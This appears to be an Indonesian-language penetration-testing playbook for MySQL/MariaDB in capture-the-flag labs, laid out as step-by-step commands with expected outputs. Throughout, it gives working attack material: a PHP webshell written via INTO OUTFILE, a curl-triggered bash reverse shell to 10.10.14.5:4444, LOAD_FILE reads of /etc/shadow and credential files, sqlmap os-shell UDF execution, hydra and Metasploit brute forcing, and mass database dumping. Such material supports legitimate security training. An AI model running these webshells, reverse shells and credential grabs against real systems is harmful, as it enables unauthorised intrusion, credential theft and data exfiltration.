#### Step 4: Password Reuse ke SSH
```bash
ssh admin@10.10.10.150
# Masukkan password: Winter2024!
# Login berhasil! User flag didapatkan.
```

---

### 📝 EXAMPLE 2: MySQL FILE Privilege ➔ Webshell Injection ➔ Initial RCE

**Target**: HackTheBox / Proving Grounds Web Server

#### Step 1: Login Menggunakan Kredensial yang Ditemukan di LFI
```bash
mysql -h 10.10.11.180 -u devuser -p'DevP@ssw0rd2024!'
```

#### Step 2: Cek Izin File
```sql
SELECT @@global.secure_file_priv;
-- Output: '' (Kosong, izin tulis di seluruh folder diizinkan!)
```

#### Step 3: Tulis Webshell ke Folder Web Root
```sql
SELECT '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}else{echo "shell ready";} ?>' 
INTO OUTFILE '/var/www/html/cmd.php';
```

#### Step 4: Validasi & Eksekusi Reverse Shell
```bash
# Uji coba:
curl -s http://10.10.11.180/cmd.php
# Output: shell ready

# Eksekusi reverse shell:
curl -G "http://10.10.11.180/cmd.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

---

### 📝 EXAMPLE 3: Maintenance File `/etc/mysql/debian.cnf` ➔ Root Database Access

**Target**: TryHackMe — Hardened Linux Box

#### Step 1: Dapatkan Kredensial dari File Sistem Lokal Target
Setelah mendapatkan shell awal sebagai user `www-data`:
```bash
cat /etc/mysql/debian.cnf
```
* **Output**:
```text
[client]
user     = debian-sys-maint
password = SecretMaintenancePassword99
```

#### Step 2: Login Sebagai User Maintenance
```bash
mysql -u debian-sys-maint -p'SecretMaintenancePassword99'
```

#### Step 3: Baca Hash Pengguna Sistem via `LOAD_FILE`
```sql
SELECT LOAD_FILE('/etc/shadow');
```

---

## ⚡ BAGIAN 10: CHEATSHEET MYSQL (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export DB_USER="root"
export DB_PASS=""
```

```bash
# ==========================================
# 1. CONNECTION COMMANDS
# ==========================================
mysql -h $TARGET -u $DB_USER -p"$DB_PASS"                        # Connect standar
mysql -h $TARGET -u root -p''                                   # Cek password kosong
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" -e "SHOW DATABASES;"  # Single query run
nxc mysql $TARGET -u $DB_USER -p "$DB_PASS"                     # Validasi NetExec

# ==========================================
# 2. ESSENTIAL RECON QUERIES (RUN IN MYSQL)
# ==========================================
# SELECT version(); SELECT user(); SHOW databases;
# SHOW GRANTS; SELECT @@global.secure_file_priv;

# ==========================================
# 3. FILE OPERATIONS (READ & WRITE)
# ==========================================
# SELECT LOAD_FILE('/etc/passwd');
# SELECT LOAD_FILE('/var/www/html/config.php');
# SELECT '[PHP_WEBSHELL]' INTO OUTFILE '/var/www/html/shell.php';

# ==========================================
# 4. HASH EXTRACTION QUERIES
# ==========================================
# SELECT user, authentication_string, host FROM mysql.user;
# SELECT user_login, user_pass FROM wp_users;

# ==========================================
# 5. UDF RCE (RAPID AUTOMATION)
# ==========================================
sqlmap -d "mysql://$DB_USER:$DB_PASS@$TARGET:3306/mysql" --os-shell

# ==========================================
# 6. BRUTE FORCE
# ==========================================
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4
```

---

## ⚡ BAGIAN 11: AUTOMATION SCRIPT — `mysql_auto_recon.sh`

Script bash praktis di Parrot OS XFCE untuk mendeteksi status port 3306, menguji password kosong, memeriksa banner informasi, dan mengekstrak basis data secara otomatis:

```bash
#!/bin/bash
# ==============================================================================
# Script Name : mysql_auto_recon.sh
# Description : Otomasi Reconnaissance MySQL & Blank Password Testing
# Usage       : ./mysql_auto_recon.sh <TARGET_IP> [USER] [PASSWORD]
# Example     : ./mysql_auto_recon.sh 10.10.11.200 root ""
# ==============================================================================

TARGET=$1
USER=${2:-root}
PASS=$3
OUTPUT_DIR="./mysql_results_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <TARGET_IP> [USER] [PASSWORD]"
    echo "Contoh: $0 10.10.11.200 root \"\""
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "\033[1;34m[*] ========================================================\033[0m"
echo -e "\033[1;34m[*] STARTING MYSQL AUTO RECON: Target $TARGET\033[0m"
echo -e "\033[1;34m[*] ========================================================\033[0m"

# Step 1: Port Scan 3306
echo -e "\n\033[1;33m[+] Step 1: Verifying Port 3306 TCP...\033[0m"
sudo nmap -sS -p 3306 -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_port3306.txt" 2>/dev/null

if grep -q "open" "$OUTPUT_DIR/nmap_port3306.txt"; then
    echo -e "\033[1;32m[+] Port 3306 MySQL/MariaDB Terdeteksi Terbuka!\033[0m"
else
    echo -e "\033[1;31m[-] Port 3306 tidak merespons atau diblokir firewall.\033[0m"
    exit 1
fi

# Step 2: Nmap NSE Audit
echo -e "\n\033[1;33m[+] Step 2: Running MySQL Nmap NSE Scripts...\033[0m"
nmap -p 3306 --script mysql-info,mysql-empty-password -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_mysql_audit.txt" 2>/dev/null
grep -E "Version|root account has empty password" "$OUTPUT_DIR/nmap_mysql_audit.txt"

# Step 3: Testing Authentication
echo -e "\n\033[1;33m[+] Step 3: Testing Direct Authentication ($USER)... \033[0m"
mysql -h "$TARGET" -u "$USER" -p"$PASS" -e "SELECT version(); SELECT user();" > "$OUTPUT_DIR/auth_test.txt" 2>&1

if grep -q "version()" "$OUTPUT_DIR/auth_test.txt"; then
    echo -e "\033[1;32m[!] LOGIN BERHASIL SEBAGAI $USER!\033[0m"
    cat "$OUTPUT_DIR/auth_test.txt"
    
    echo -e "\n\033[1;33m[+] Step 4: Extracting Database List & secure_file_priv...\033[0m"
    mysql -h "$TARGET" -u "$USER" -p"$PASS" -e "SHOW DATABASES; SHOW VARIABLES LIKE 'secure_file_priv';" | tee "$OUTPUT_DIR/databases_and_priv.txt"
else
    echo -e "\033[1;31m[-] Otentikasi gagal untuk user $USER.\033[0m"
fi

echo -e "\n\033[1;34m[*] Reconnaissance MySQL selesai! Seluruh log tersimpan di: $OUTPUT_DIR/\033[0m"
```

```bash
# Cara Menjalankan Script di Parrot OS:
chmod +x mysql_auto_recon.sh
./mysql_auto_recon.sh 10.10.11.200 root ""
```

---

## 🚀 LANJUT KE FILE 14b: MSSQL WORKFLOW

### Mengapa MSSQL Workflow Adalah Tahap Berikutnya?

Setelah menguasai database open-source nomor satu di lingkungan Linux (**MySQL / MariaDB**), target database enterprise paling bernilai tinggi di lingkungan Windows Active Directory adalah **Microsoft SQL Server (MSSQL - Port 1433 TCP)**.

```text
+=============================================================================+
|                      PENTEST NETWORK FLOW CONTINUITY                        |
+=============================================================================+
|                                                                             |
|   [ 14a. MYSQL WORKFLOW ] ──> Linux Open-Source Database (Port 3306):       |
|                               LOAD_FILE(), INTO OUTFILE, & UDF Exploitation |
|            │                                                                |
|            ▼                                                                |
|   [ 14b. MSSQL WORKFLOW ] ──> Windows Enterprise Database (Port 1433):      |
|                               xp_cmdshell RCE, Impersonasi Sa Login,        |
|                               Kerberoasting SPN MSSQL, NTLM Relay Stealing, |
|                               serta Database Link Pivoting ke Domain Admin! |
+=============================================================================+
```

# 14a. MySQL & MariaDB Exploitation Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export DB_USER="root"
export DB_PASS=""
mkdir -p ~/mysql_loot/{files,creds,hashes,shells}
cd ~/mysql_loot

echo "[*] Target: $TARGET | DB_USER: $DB_USER | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | DB_USER: root | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Ping Test (Deteksi OS via TTL)

Bash

```
ping -c 3 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~64 (Linux):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=63 time=18.4 ms
```

➡️ **Kesimpulan:** Target Linux → kemungkinan besar MySQL/MariaDB. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=127 time=45.2 ms
```

➡️ **Kesimpulan:** Target Windows → MySQL jarang di Windows, tapi tetap mungkin. Lebih sering MSSQL → cek port 1433 juga. Lanjut **Langkah 0.2**

**OUTPUT GAGAL ❌ — Request timeout:**

text

```
Request timeout for icmp_seq 0
```

➡️ Firewall blokir ICMP. Tambahkan `-Pn` di semua nmap. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Fast Port Check (Konfirmasi MySQL aktif)

Bash

```
# Command 1: Quick TCP check
nmap -Pn -p 3306 --open $TARGET

# Command 2: Jika ingin sekalian cek port database lain
nmap -Pn -p 3306,1433,5432,27017,6379 --open $TARGET -oN nmap_db_ports.txt
```

**OUTPUT BERHASIL ✅ — Port 3306 open:**

text

```
PORT     STATE SERVICE
3306/tcp open  mysql
```

➡️ MySQL aktif dan bisa diakses dari luar. Lanjut ke **Langkah 0.3**

**OUTPUT GAGAL ❌ — Port 3306 filtered/closed:**

text

```
PORT     STATE    SERVICE
3306/tcp filtered mysql
```

➡️ MySQL mungkin hanya mendengarkan di localhost (`bind-address = 127.0.0.1`). Ini SANGAT UMUM di server produksi.

Bash

```
# Cek apakah port benar-benar tertutup atau hanya filtered
nmap -Pn -p 3306 -sV --reason $TARGET

# Jika target sudah dapat diakses via SSH/shell → pivot ke lokal
# (Scenario: kamu punya user shell tapi belum root)
# SSH Local Port Forwarding:
ssh -L 33306:127.0.0.1:3306 user@$TARGET -N -f
# Setelah tunnel aktif:
mysql -h 127.0.0.1 -P 33306 -u root -p''
```

**OUTPUT GAGAL ❌ — Port 3306 tidak ada di hasil scan sama sekali:**  
➡️ MySQL mungkin tidak terinstall. Lanjut scan port lain: MSSQL (1433), PostgreSQL (5432). Jika context ini adalah saat sudah dapat shell di target, cek:

Bash

```
# Di shell target:
ss -tunlp | grep -E "3306|mysql"
ps aux | grep -i mysql
systemctl status mysql 2>/dev/null || systemctl status mariadb 2>/dev/null
```

---

### Langkah 0.3 — Nmap Detailed Fingerprint MySQL

Bash

```
# Command 1: Service version + NSE info
nmap -sV -p 3306 --script mysql-info $TARGET -oN nmap_mysql_detail.txt

# Command 2: Cek empty password langsung (sering menjadi jackpot pertama)
nmap -p 3306 --script mysql-empty-password $TARGET

# Command 3: Gabungkan semua dalam satu scan
nmap -sV -p 3306 --script "mysql-*" $TARGET -oN nmap_mysql_full.txt
```

**OUTPUT BERHASIL ✅ — mysql-info:**

text

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.32-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.32-0ubuntu0.18.04.1
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: SupportsTransactions, Support41Auth, Speaks41ProtocolNew
|   Status: Autocommit
|   Salt: AbCdEfGhIjKlMnOpQ
|_  Auth Plugin Name: mysql_native_password
```

**Cara baca output ini — PENTING, catat semua:**

|Field|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`Version: 5.7.x`|MySQL 5.7|Versi lama → lebih rentan ke misconfiguration|
|`Version: 8.0.x`|MySQL 8.0|Modern → default lebih ketat|
|`MariaDB-10.x`|MariaDB|Fork MySQL, behavior identik|
|`Auth Plugin: mysql_native_password`|Password hash|Standard login via password|
|`Auth Plugin: auth_socket`|OS socket auth|Login via `sudo mysql` tanpa password|

**OUTPUT BERHASIL ✅ — mysql-empty-password JACKPOT:**

text

```
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password:
|_  root account has empty password
```

➡️ **LANGSUNG KE FASE 2 — Login tanpa password!**

**OUTPUT AMAN ✅ — Tidak ada empty password:**

text

```
| mysql-empty-password:
|_  (nothing here)
```

➡️ Root sudah di-set password. Lanjut ke **Fase 1 (Credential Discovery)**

> 📌 **SIMPAN INFO INI:**
> 
> Bash
> 
> ```
> # Catat versi MySQL untuk cari CVE nanti
> MYSQL_VERSION=$(grep "Version:" nmap_mysql_detail.txt | awk '{print $2}')
> echo "MySQL Version: $MYSQL_VERSION"
> # Search CVE: site:exploit-db.com "MySQL $MYSQL_VERSION"
> ```

---

## ═══════════════════════════════════════

## FASE 1: CREDENTIAL DISCOVERY (Sebelum Login)

## ═══════════════════════════════════════

> **Tujuan fase ini:** Temukan credentials MySQL dari berbagai sumber sebelum mulai brute force. Ini lebih cepat dan akurat.

### Langkah 1.1 — Cari Credentials dari Sumber yang Sudah Ada

Bash

```
# Jika sudah dapat shell/akses ke file target sebelumnya:

# Command 1: File konfigurasi Debian/Ubuntu — SERING TERLEWAT!
cat /etc/mysql/debian.cnf
# Atau baca via SMB/LFI jika ada akses
# Via LFI: http://target/vuln.php?file=/etc/mysql/debian.cnf

# Command 2: File konfigurasi MySQL utama
cat /etc/mysql/my.cnf
cat /etc/mysql/mariadb.conf.d/50-server.cnf
grep -r "password" /etc/mysql/ 2>/dev/null

# Command 3: Config file web application (paling sering ada creds!)
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env
find /var/www/ -name "*.php" -exec grep -l "db_pass\|DB_PASSWORD\|mysqli\|PDO" {} \; 2>/dev/null

# Command 4: File .bash_history user (sering ada password yang di-type manual)
cat ~/.bash_history | grep -i "mysql\|pass"
cat /root/.bash_history 2>/dev/null | grep -i mysql
```

**OUTPUT BERHASIL ✅ — /etc/mysql/debian.cnf:**

text

```
[client]
host     = localhost
user     = debian-sys-maint
password = A1b2C3d4E5f6G7h8I9j0
socket   = /var/run/mysqld/mysqld.sock
```

➡️ **SIMPAN DAN LANGSUNG TEST:**

Bash

```
export DB_USER="debian-sys-maint"
export DB_PASS="A1b2C3d4E5f6G7h8I9j0"
echo "$DB_USER:$DB_PASS" >> ~/mysql_loot/creds/found_creds.txt
# Akun ini punya privilege setara root! Lanjut ke Fase 2.
```

**OUTPUT BERHASIL ✅ — wp-config.php:**

PHP

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'Sup3rS3cr3tP@ss!' );
define( 'DB_HOST', 'localhost' );
```

➡️ **SIMPAN:**

Bash

```
export DB_USER="wpuser"
export DB_PASS="Sup3rS3cr3tP@ss!"
echo "MySQL - $DB_USER:$DB_PASS (wordpress db)" >> ~/mysql_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Tidak ada akses ke file system target:**  
➡️ Belum ada shell. Lanjut ke **Langkah 1.2 — Cek credential reuse dari service lain**

---

### Langkah 1.2 — Test Credential Reuse (dari SMB/SSH/Web yang sudah didapat)

Bash

```
# Jika sebelumnya sudah dapat credentials dari service lain (SMB, FTP, web, dll)
# Test semua kombinasi ke MySQL:

# Command 1: Test via NetExec (paling cepat)
nxc mysql $TARGET -u root -p ''                          # blank password
nxc mysql $TARGET -u root -p 'root'                     # default
nxc mysql $TARGET -u root -p 'toor'                     # reverse
nxc mysql $TARGET -u root -p 'mysql'                    # default MySQL
nxc mysql $TARGET -u root -p 'password'                 # common
nxc mysql $TARGET -u admin -p 'admin'                   # common admin

# Command 2: Jika ada creds dari SMB/SSH sebelumnya
nxc mysql $TARGET -u "$USER" -p "$PASS"

# Command 3: Test langsung via mysql CLI (lebih informatif errornya)
mysql -h $TARGET -u root -p'' -e "SELECT 1;" 2>/dev/null && echo "[+] BLANK PASSWORD WORKS!" || echo "[-] Failed"
```

**OUTPUT BERHASIL ✅ — NetExec:**

text

```
MYSQL  10.10.11.200  3306  10.10.11.200  [+] root: (no pass)
```

➡️ Credential valid! Lanjut ke **Fase 2**

**OUTPUT GAGAL ❌ — Semua gagal:**

text

```
MYSQL  10.10.11.200  3306  10.10.11.200  [-] root: Access denied for user 'root'@'10.10.14.5'
```

➡️ Lanjut ke **Langkah 1.3 — Brute Force**

---

### Langkah 1.3 — Brute Force (Last Resort)

Bash

```
# Command 1: Hydra (paling reliabel untuk MySQL)
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4 -V

# Command 2: Hydra dengan multiple usernames
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/rockyou.txt \
      mysql://$TARGET -t 4

# Command 3: NetExec dengan wordlist
nxc mysql $TARGET -u root -p /usr/share/wordlists/rockyou.txt \
    --continue-on-success | grep "\[+\]"

# Command 4: Metasploit MySQL login module
msfconsole -q -x "
use auxiliary/scanner/mysql/mysql_login;
set RHOSTS $TARGET;
set USERNAME root;
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt;
set STOP_ON_SUCCESS true;
run;
exit
"
```

**OUTPUT BERHASIL ✅ — Hydra crack:**

text

```
[3306][mysql] host: 10.10.11.200  login: root  password: dragon123
```

➡️ **SIMPAN:**

Bash

```
export DB_PASS="dragon123"
echo "root:dragon123" >> ~/mysql_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Brute force tidak menemukan:**

text

```
[ERROR] Not a single valid password found.
```

➡️ Kemungkinan:

1. Password sangat kuat → tidak ada di rockyou
2. MySQL tidak boleh diakses dari IP kamu → butuh pivot
3. Lanjutkan ke **Fase lain (web exploit / SSH / SMB)** dulu untuk dapat foothold, lalu kembali ke MySQL

> 💡 **Google Search saat buntu:**
> 
> - `site:exploit-db.com MySQL [versi yang ditemukan di Langkah 0.3]`
> - `"MySQL 5.7 CVE" authentication bypass`
> - `HackTheBox MySQL [nama mesin]` (jika CTF)

---

## ═══════════════════════════════════════

## FASE 2: AUTENTIKASI & KONFIRMASI AKSES

## ═══════════════════════════════════════

> **Masuk sini setelah dapat credentials valid dari Fase 1 atau Fase 0.3**

### Langkah 2.1 — Login ke MySQL

Bash

```
# Command 1: Login interaktif standar
mysql -h $TARGET -u $DB_USER -p"$DB_PASS"

# Command 2: Login dan langsung eksekusi command (non-interaktif)
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" -e "SELECT version(); SELECT user();"

# Command 3: Login dengan spesifik database
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" -D wordpress

# Command 4: Login via auth_socket (jika sudah di dalam target sebagai root Linux)
sudo mysql
# atau
mysql -u root
```

**OUTPUT BERHASIL ✅ — Masuk ke prompt MySQL:**

text

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

mysql>
```

➡️ **Berhasil masuk! Langsung ke Fase 3 — Reconnaissance**

**OUTPUT GAGAL ❌ — Access denied:**

text

```
ERROR 1045 (28000): Access denied for user 'root'@'10.10.14.5' (using password: YES)
```

➡️ Password salah atau IP tidak diizinkan. Coba:

Bash

```
# Variasi 1: Coba tanpa password
mysql -h $TARGET -u $DB_USER -p''

# Variasi 2: Coba local-auth (user@localhost bukan user@%)
# Butuh SSH tunnel dulu:
ssh -L 33306:127.0.0.1:3306 user@$TARGET -N -f
mysql -h 127.0.0.1 -P 33306 -u root -p"$DB_PASS"

# Variasi 3: Coba user lain yang umum di MySQL
mysql -h $TARGET -u admin -p"$DB_PASS"
mysql -h $TARGET -u mysql -p"$DB_PASS"
```

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
ERROR 2003 (HY000): Can't connect to MySQL server on '10.10.11.200' (111)
```

➡️ MySQL hanya bind ke localhost. Wajib SSH tunnel:

Bash

```
# Setup tunnel dulu (butuh akses SSH ke target)
ssh -L 33306:127.0.0.1:3306 user@$TARGET -N -f &
sleep 2
mysql -h 127.0.0.1 -P 33306 -u root -p"$DB_PASS"
```

**OUTPUT GAGAL ❌ — Host not allowed:**

text

```
ERROR 1130 (HY000): Host '10.10.14.5' is not allowed to connect to this MySQL server
```

➡️ User MySQL hanya boleh dari localhost. Sama dengan di atas → SSH tunnel.

---

## ═══════════════════════════════════════

## FASE 3: MYSQL RECONNAISSANCE (9 QUERY WAJIB)

## ═══════════════════════════════════════

> **Tujuan:** Mapping seluruh database, privilege, dan konfigurasi kritis. Jangan skip, jalankan semua berurutan.

### Langkah 3.1 — Identifikasi Dasar

SQL

```
-- Query 1: Versi MySQL + OS server
SELECT version();
```

**OUTPUT BERHASIL ✅:**

text

```
+------------------------------------+
| version()                          |
+------------------------------------+
| 5.7.32-0ubuntu0.18.04.1            |
+------------------------------------+
```

➡️ Catat versi! Search CVE jika versi lama.

SQL

```
-- Query 2: Siapa kita? (user aktif saat ini)
SELECT user(), current_user();
```

**OUTPUT BERHASIL ✅:**

text

```
+------------------+------------------+
| user()           | current_user()   |
+------------------+------------------+
| root@10.10.14.5  | root@%           |
+------------------+------------------+
```

**Interpretasi:**

|`current_user()`|Arti|Implikasi|
|---|---|---|
|`root@%`|Root dengan akses dari mana saja|Privilege penuh, tapi remote|
|`root@localhost`|Root hanya dari lokal|Sudah pivot ke dalam server|
|`wpuser@localhost`|User aplikasi|Privilege terbatas, hanya bisa akses DB tertentu|

SQL

```
-- Query 3: List semua database
SHOW databases;
```

**OUTPUT BERHASIL ✅:**

text

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
| custom_app         |
+--------------------+
```

➡️ **Analisis:**

- `mysql` = database sistem, berisi tabel `user` dengan semua hashes
- `wordpress`, `custom_app` = database aplikasi → target looting
- Abaikan `information_schema`, `performance_schema`, `sys`

---

### Langkah 3.2 — Audit Privilege (KRITIS!)

SQL

```
-- Query 4: Cek hak akses kita
SHOW GRANTS;
```

**OUTPUT BERHASIL ✅ — Full privileges:**

text

```
+------------------------------------------------------------------------+
| Grants for root@%                                                       |
+------------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION           |
+------------------------------------------------------------------------+
```

➡️ **ROOT PENUH!** Bisa lakukan segalanya termasuk FILE operations dan UDF.

**OUTPUT TERBATAS ✅ — Limited privileges:**

text

```
+------------------------------------------------------------+
| Grants for wpuser@localhost                                 |
+------------------------------------------------------------+
| GRANT SELECT, INSERT, UPDATE, DELETE ON wordpress.* TO ... |
+------------------------------------------------------------+
```

➡️ Akun aplikasi → bisa dump data wordpress, tapi tidak bisa FILE atau UDF. Fokus ke looting data saja.

SQL

```
-- Query 5: CEK secure_file_priv — PALING KRITIS!
SELECT @@global.secure_file_priv;
SHOW VARIABLES LIKE 'secure_file_priv';
```

**OUTPUT BERHASIL ✅ — TIKET EMAS (string kosong):**

text

```
+---------------------------+
| @@global.secure_file_priv |
+---------------------------+
|                           |
+---------------------------+
```

➡️ `''` = **Tidak ada pembatasan direktori!** Bisa baca/tulis file di mana saja → Langsung ke **Fase 5 dan 6**

**OUTPUT TERBATAS ⚠️ — Direktori spesifik:**

text

```
+-----------+------------------------------+
| Variable  | Value                        |
+-----------+------------------------------+
| secure... | /var/lib/mysql-files/        |
+-----------+------------------------------+
```

➡️ Hanya bisa operasi file di folder itu. Tulis payload ke `/var/lib/mysql-files/` saja.

**OUTPUT TERBLOKIR ❌ — NULL:**

text

```
+---------------------------+
| @@global.secure_file_priv |
+---------------------------+
| NULL                      |
+---------------------------+
```

➡️ FILE operations dinonaktifkan total. Skip Fase 5 (LOAD_FILE) dan Fase 6 (INTO OUTFILE). Fokus ke dump data dan UDF.

---

### Langkah 3.3 — Recon Tambahan

SQL

```
-- Query 6: Lokasi direktori data fisik
SELECT @@datadir;
```

**OUTPUT:**

text

```
+-----------------+
| @@datadir       |
+-----------------+
| /var/lib/mysql/ |
+-----------------+
```

SQL

```
-- Query 7: Lokasi direktori plugin (untuk UDF nanti)
SHOW VARIABLES LIKE 'plugin_dir';
```

**OUTPUT:**

text

```
+---------------+-------------------------+
| Variable_name | Value                   |
+---------------+-------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/  |
+---------------+-------------------------+
```

➡️ Catat path ini! Akan diperlukan saat UDF exploitation di Fase 8.

SQL

```
-- Query 8: List semua user MySQL dan host
SELECT user, host, authentication_string FROM mysql.user;
```

**OUTPUT BERHASIL ✅:**

text

```
+------------------+-----------+-------------------------------------------+
| user             | host      | authentication_string                     |
+------------------+-----------+-------------------------------------------+
| root             | localhost | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| root             | %         |                                           |
| debian-sys-maint | localhost | *8E67B5F1E1C6DC25A8F8...                 |
| wpuser           | localhost | *1A2B3C4D5E6F...                         |
+------------------+-----------+-------------------------------------------+
```

➡️ **SIMPAN HASHES untuk cracking nanti:**

Bash

```
# Simpan ke file
mysql -h $TARGET -u $DB_USER -p"$DB_PASS" \
    -e "SELECT user, host, authentication_string FROM mysql.user;" \
    > ~/mysql_loot/hashes/mysql_user_hashes.txt
```

SQL

```
-- Query 9: Cek apakah skip-grant-tables aktif (indikasi misconfiguration parah)
SHOW VARIABLES LIKE 'skip_grant%';
```

---

### Langkah 3.4 — Explore Database Aplikasi

SQL

```
-- Masuk ke database target
USE wordpress;

-- Lihat semua tabel
SHOW tables;
```

**OUTPUT BERHASIL ✅:**

text

```
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
```

➡️ Ada `wp_users`! Langsung dump:

SQL

```
-- Dump user credentials WordPress
SELECT user_login, user_pass, user_email FROM wp_users;
```

**OUTPUT BERHASIL ✅:**

text

```
+------------+------------------------------------+---------------------------+
| user_login | user_pass                          | user_email                |
+------------+------------------------------------+---------------------------+
| admin      | $P$B987654321fedcba0123456789abcde | admin@company.local       |
| editor     | $P$CAaBbCcDdEeFfGgHhIi...           | editor@company.local      |
+------------+------------------------------------+---------------------------+
```

➡️ **SIMPAN DAN CRACK!** (ke Fase 7)

**Cek opsi WordPress (sering ada URL, email, secret keys):**

SQL

```
SELECT option_name, option_value FROM wp_options 
WHERE option_name IN ('siteurl','blogname','admin_email') LIMIT 10;
```

---

## ═══════════════════════════════════════

## FASE 4: DATABASE LOOTING (Dump Semua Data Sensitif)

## ═══════════════════════════════════════

> **Tujuan:** Extract semua credentials, email, API keys dari semua database. Jangan pilih-pilih.

### Langkah 4.1 — Identifikasi Tabel Sensitif di Semua Database

SQL

```
-- Cari tabel yang mengandung kata kunci sensitif di semua DB
SELECT table_schema, table_name 
FROM information_schema.tables 
WHERE table_name LIKE '%user%' 
   OR table_name LIKE '%admin%' 
   OR table_name LIKE '%account%'
   OR table_name LIKE '%password%'
   OR table_name LIKE '%credential%'
ORDER BY table_schema, table_name;
```

**OUTPUT BERHASIL ✅:**

text

```
+--------------+------------------+
| table_schema | table_name       |
+--------------+------------------+
| wordpress    | wp_users         |
| custom_app   | users            |
| custom_app   | admin_accounts   |
| hrms         | employee_logins  |
+--------------+------------------+
```

➡️ Dump semua tabel yang muncul!

SQL

```
-- Dump tabel users dari custom_app
USE custom_app;
SELECT * FROM users LIMIT 20;
SELECT * FROM admin_accounts LIMIT 20;
```

---

### Langkah 4.2 — Mass Dump via mysqldump (Di Luar MySQL Prompt)

Bash

```
# Di terminal Parrot OS (bukan di dalam mysql prompt):

# Command 1: Dump SEMUA database sekaligus
mysqldump -h $TARGET -u $DB_USER -p"$DB_PASS" \
    --all-databases > ~/mysql_loot/files/full_dump.sql

# Command 2: Dump database spesifik
mysqldump -h $TARGET -u $DB_USER -p"$DB_PASS" \
    wordpress > ~/mysql_loot/files/wordpress_dump.sql

# Command 3: Dump hanya tabel tertentu
mysqldump -h $TARGET -u $DB_USER -p"$DB_PASS" \
    wordpress wp_users > ~/mysql_loot/files/wp_users_dump.sql

# Setelah dump, grep credentials dari file:
grep -iE "(password|pass|secret|key|token|api)" ~/mysql_loot/files/full_dump.sql | head -50
```

**OUTPUT BERHASIL ✅:**

text

```
-- Dump completed on 2024-01-15 10:30:45
```

Bash

```
# Analisis dump untuk credentials
grep -iE "INSERT INTO.*user" ~/mysql_loot/files/full_dump.sql | head -20
grep -oP "'[^']{20,}'" ~/mysql_loot/files/full_dump.sql | sort -u | head -30
```

**OUTPUT GAGAL ❌ — mysqldump: Got error:**

text

```
mysqldump: Got error: 1044: Access denied for user 'wpuser'@'localhost' to database 'mysql'
```

➡️ User tidak punya akses ke semua database. Dump hanya database yang diizinkan:

Bash

```
mysqldump -h $TARGET -u $DB_USER -p"$DB_PASS" \
    --databases wordpress custom_app > ~/mysql_loot/files/accessible_dump.sql
```

---

## ═══════════════════════════════════════

## FASE 5: FILE READ VIA LOAD_FILE (Jika secure_file_priv = '')

## ═══════════════════════════════════════

> **Prasyarat:** `secure_file_priv` bernilai `''` (kosong) DAN user punya privilege `FILE`

### Langkah 5.1 — Baca File Sistem Kritis

SQL

```
-- Test dasar: apakah LOAD_FILE bekerja?
SELECT LOAD_FILE('/etc/passwd');
```

**OUTPUT BERHASIL ✅:**

text

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:112:117:MySQL Server,,,:/var/lib/mysql:/bin/false
admin:x:1000:1000:admin:/home/admin:/bin/bash
```

